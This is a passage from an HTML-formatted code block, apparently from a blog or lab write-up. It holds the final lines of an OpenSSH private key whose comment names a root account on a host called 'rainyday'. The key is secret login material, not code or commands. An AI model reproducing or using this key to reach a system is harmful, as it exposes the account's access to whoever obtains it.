class="line">r&#x2F;foCPAsturEBn+rWYef2oz+rkvDnQ6suOyR5lnPQkCjYAa3Dypb4JPoQI1owom1TZPHn&#x2F;</span><br><span class="line">fwVsmTG8X4vacuU&#x2F;7lIVlrMQTPOFVZnp6GUDvkdDIDaejSbtrKzd3HgYKskqsQTsoRy0G8</span><br><span class="line">WjzNqmG+AkObbMztyKkUn4JaWMBu+1Ih6ktjcZHWbqFExwSiN8hNtgMyLnNlZ+znDu5pWt</span><br><span class="line">L3KPIDIHZQKXkkcxQk8d9ZI&#x2F;93kHRuS5aapFQRhpHGNxGrB8WiuReUMg7pSzGwvNHXAAAA</span><br><span class="line">wEiT1K8kV7sGj&#x2F;vc1hKRgEDLV4y2HFgB+u7u6VuBJrXhkQOSXbrr1nLezugFRYk60aovOK</span><br><span class="line">vLOiWz+h8XN0ej9xA&#x2F;Bc6kuRvshHHvnA&#x2F;C7dzycowwzA5kpBO65VTzRsMbCHkPhosLhDCd</span><br><span class="line">uTYdUyeHGNy5b6K8iQvxXnftFrl8Nd9jel4uU41ZncRXutaf7oW90BqV+gMMyZ8StIOHkb</span><br><span class="line">2jPmSN47W7QhU9qnd+I&#x2F;SdoA6bNoBHE3+pSg7Re0K0Ux5qRAAAAMEAzxC5hKDH0pMsoZWM</span><br><span class="line">7w71c8ogLfjYq&#x2F;fzjFD&#x2F;&#x2F;eSlrolCv90rtCZrkR63zeEsJ0EBwCNPNHpB34ThRD4LwBTZ+U</span><br><span class="line">jXwWHwXwsg599xjPOGwsDd48lsi6UedANqHD&#x2F;lLxJWVBZpYuZPHY2ReMRz+cB340Z5p5kh</span><br><span class="line">jbCBrxoeIymL9iF9TG01BqKJY+lCzUyW3ye3+&#x2F;87BQ&#x2F;KqXL3BZKAlGBQBgA&#x2F;kWzU1XAsT+</span><br><span class="line">5pryLONZq&#x2F;K+8xuQRlfAt7h2lbsSXDAAAAwQDravvp+1aMbCpdCniJZTG6rZ&#x2F;wIjxoCz9n</span><br><span class="line">9ErjcpMFUJwTKulbbrc79vA3Id4unTO8cuylOMgFlUCpKr9v2GeoMIeoLntX91mM1U+3m9</span><br><span class="line">v2Vcad36DpoqEZc0XWupuypRjqIZy0aO1insvD985C0z00eL6GYbibjTdNT90C&#x2F;ew2r4ZU</span><br><span class="line">g0hHlWENPwufIajaQylDoQ6xsXkU7a7Py+Sq5UWE7LzwxYqlOyDZfjSroXYhy5P+0KP+fl</span><br><span class="line">NzL6B2X8MLQ8cAAAANcm9vdEByYWlueWRheQECAwQFBg&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
